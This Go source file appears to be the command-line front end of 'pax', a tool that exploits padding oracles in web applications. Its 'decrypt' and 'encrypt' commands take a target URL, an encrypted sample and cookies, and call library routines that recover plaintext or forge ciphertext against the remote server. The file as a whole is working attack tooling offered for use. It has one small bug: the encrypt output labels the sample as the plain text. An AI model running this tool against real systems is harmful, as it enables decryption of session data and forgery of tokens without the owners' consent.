package main

import (
	"fmt"
	"net/http"
	"os"

	"github.com/liamg/tml"

	"github.com/liamg/pax/internal/app/pax"

	"github.com/spf13/cobra"
)

var url string
var sample string
var cookies string
var blockSize int = 16
var method string = http.MethodGet
var plaintext string
var failureText string
var encoding string = string(pax.EncodingAuto)

func init() {
	rootCmd.AddCommand(decryptCmd)
	rootCmd.AddCommand(encryptCmd)
	encryptCmd.Flags().StringVarP(&plaintext, "plain-text", "p", plaintext, "Plaintext to encrypt.")
	rootCmd.PersistentFlags().StringVarP(&url, "url", "u", url, "The URL of the suspected padding oracle. Required.")
	rootCmd.PersistentFlags().StringVarP(&sample, "sample", "s", sample, "A sample of encrypted data, which can be base64 and/or url encoded. This sample should also appear at least one of the --url/--cookies. Required,")
	rootCmd.PersistentFlags().StringVarP(&cookies, "cookies", "c", cookies, "A string containing cookies. e.g. \"PHPSESSID=123456536;LOC=1;X=NO\".")
	rootCmd.PersistentFlags().IntVarP(&blockSize, "block-size", "b", blockSize, "The block size used by the padding oracle. Usually 8, 16, or 32.")
	rootCmd.PersistentFlags().StringVarP(&method, "method", "m", method, "The HTTP verb to use when sending requests to the oracle.")
	rootCmd.PersistentFlags().StringVarP(&encoding, "encoding", "e", encoding, "The encoding used for the encrypted data: one of auto, base64, base64-url, url, none.")
	rootCmd.PersistentFlags().StringVarP(&failureText, "failure-text", "f", failureText, "Text which is output by the oracle when a padding error occurs. If this is omitted, HTTP status codes will be used.")
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

var rootCmd = &cobra.Command{
	Short: "Decrypt padding oracles for fun and profit",
}

var decryptCmd = &cobra.Command{
	Use:   "decrypt",
	Short: "attempt to decrypt data by exploiting a potential padding oracle",
	Run: func(cmd *cobra.Command, args []string) {

		if url == "" {
			tml.Printf("<red>You must supply a --url - run with the --help flag for details</red>\n")
			os.Exit(1)
		}

		if sample == "" {
			tml.Printf("<red>You must supply a --sample - run with the --help flag for details</red>\n")
			os.Exit(1)
		}

		options := pax.ExploitOptions{
			BlockSize:   blockSize,
			Method:      method,
			Cookies:     cookies,
			Encoding:    pax.Encoding(encoding),
			FailureText: failureText,
		}

		output, err := pax.Decrypt(url, sample, &options)
		if err != nil {
			tml.Printf("<red>Decryption failed: %s</red>\n", err)
			os.Exit(1)
		}

		tml.Printf("<green>Decryption successful:</green>\n\n")

		tml.Printf("URL:        %s\n", url)
		tml.Printf("Input:      %s\n", sample)
		tml.Printf("Plaintext:\n\n%s\n\n", string(output))

	},
}

var encryptCmd = &cobra.Command{
	Use:   "encrypt",
	Short: "attempt to encrypt data by exploiting a potential padding oracle",
	Run: func(cmd *cobra.Command, args []string) {

		if url == "" {
			tml.Printf("<red>You must supply a --url - run with the --help flag for details</red>\n")
			os.Exit(1)
		}

		if sample == "" {
			tml.Printf("<red>You must supply a --sample - run with the --help flag for details</red>\n")
			os.Exit(1)
		}

		if plaintext == "" {
			tml.Printf("<red>You must supply a --plain-text - run with the --help flag for details</red>\n")
			os.Exit(1)
		}

		options := pax.ExploitOptions{
			BlockSize:   blockSize,
			Method:      method,
			Cookies:     cookies,
			PlainText:   plaintext,
			Encoding:    pax.Encoding(encoding),
			FailureText: failureText,
		}

		output, err := pax.Encrypt(url, sample, &options)
		if err != nil {
			tml.Printf("<red>Encryption failed: %s</red>\n", err)
			os.Exit(1)
		}

		tml.Printf("<green>Encryption successful:</green>\n\n")

		tml.Printf("URL:        %s\n", url)
		tml.Printf("Input:      %s\n", sample)
		tml.Printf("Plain Text: %s\n", sample)
		tml.Printf("Encrypted:\n\n%s\n\n", string(output))

	},
}
